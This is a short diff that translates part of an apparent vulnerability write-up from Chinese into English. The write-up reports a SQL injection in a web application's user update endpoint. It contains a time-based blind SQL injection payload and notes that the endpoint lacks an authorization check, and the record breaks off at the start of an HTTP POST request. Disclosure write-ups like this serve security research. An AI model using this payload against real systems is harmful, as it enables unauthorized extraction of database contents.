@@ -1,8 +1,8 @@
-在代码中可以看到存在注入点：
+You can see in the code that there are injection points:
 
 ![image-20250407114514271](image-20250407114514271.png)
 
-向上跟踪到 controller：
+Trace up to controller:
 
 ![image-20250407114615555](image-20250407114615555.png)
 
@@ -12,7 +12,7 @@ Payload：
 1 AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>100, SLEEP(3), 0)
 ```
 
-并且该接口没有权限校验，所以可以前台注入
+And the interface has no permission check, so it can be injected in the foreground
 
 ```
 POST /api/user/update HTTP/1.1
